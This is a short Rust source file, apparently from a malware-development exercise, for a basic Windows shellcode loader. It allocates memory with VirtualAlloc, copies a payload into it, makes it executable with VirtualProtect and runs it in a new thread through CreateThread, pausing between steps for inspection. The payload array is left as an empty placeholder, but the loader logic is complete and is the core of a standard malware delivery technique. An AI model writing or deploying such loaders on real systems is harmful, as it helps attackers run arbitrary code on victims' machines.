// most basic shellcode loader in rust
// need to add actual payload + len
// all functions are essentially the same Win API functions as we used with C
// but instead of RtlMoveMemory() to inject code into buffer we use ptr::copy_nonoverlapping

use std::ffi::c_void;
use std::io::{self, Write};
use std::mem;
use std::ptr;
use winapi::shared::minwindef::{BOOL, DWORD, LPVOID};
use winapi::um::errhandlingapi::GetLastError;
use winapi::um::handleapi::CloseHandle;
use winapi::um::memoryapi::{VirtualAlloc, VirtualFree, VirtualProtect};
use winapi::um::processthreadsapi::{CreateThread, WaitForSingleObject};
use winapi::um::synchapi::Sleep;
use winapi::um::winnt::{MEM_COMMIT, MEM_RELEASE, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE};

fn error_handler(message: &str, error_code: DWORD) -> DWORD {
    println!("{} (Error Code: {})", message, error_code);
    error_code
}

fn forced_breakpoint(message: &str) {
    println!("{}", message);
    println!("Hit enter to continue!");
    io::stdout().flush().unwrap();
    io::stdin().read_line(&mut String::new()).unwrap();
}

fn main() {
    // STEP 0: Define payload and payload length
    let payload: [u8; /* payload length */] = [ /* payload */ ];
    let payload_length = payload.len();

    // STEP 1: Allocate a memory buffer for payload
    let payload_mem = unsafe {
        VirtualAlloc(
            ptr::null_mut(),
            payload_length,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        )
    };
    if payload_mem.is_null() {
        let error_code = unsafe { GetLastError() };
        error_handler("Failed to allocate memory", error_code);
        return;
    }

    let pointer_width = mem::size_of::<LPVOID>() * 2;
    println!(
        "{:20} : {:0width$p}",
        "payload is stored at:",
        payload.as_ptr(),
        width = pointer_width
    );
    println!(
        "{:20} : {:0width$p}",
        "memory allocated at:",
        payload_mem,
        width = pointer_width
    );

    forced_breakpoint("Memory has been allocated");

    // STEP 2: Copy payload to allocated buffer
    unsafe {
        ptr::copy_nonoverlapping(payload.as_ptr(), payload_mem as *mut u8, payload_length);
    }
    forced_breakpoint("Payload has been copied to buffer");

    // STEP 3: Change memory protection constants to allow execution
    let mut old_protect = 0;
    let change_perm = unsafe {
        VirtualProtect(
            payload_mem,
            payload_length,
            PAGE_EXECUTE_READ,
            &mut old_protect,
        )
    };
    if change_perm == 0 {
        let error_code = unsafe { GetLastError() };
        error_handler("Failed to change memory permissions", error_code);
        return;
    }

    forced_breakpoint("Memory protection constants have been updated");

    // STEP 4: Execute payload
    let thread_handle = unsafe {
        CreateThread(
            ptr::null_mut(),
            0,
            Some(mem::transmute(payload_mem)),
            ptr::null_mut(),
            0,
            ptr::null_mut(),
        )
    };
    if thread_handle.is_null() {
        let error_code = unsafe { GetLastError() };
        error_handler("Failed to execute payload", error_code);
        return;
    }

    // Ensure payload completes
    unsafe {
        WaitForSingleObject(thread_handle, 5000);
        CloseHandle(thread_handle);
        VirtualFree(payload_mem, 0, MEM_RELEASE);

    }
}



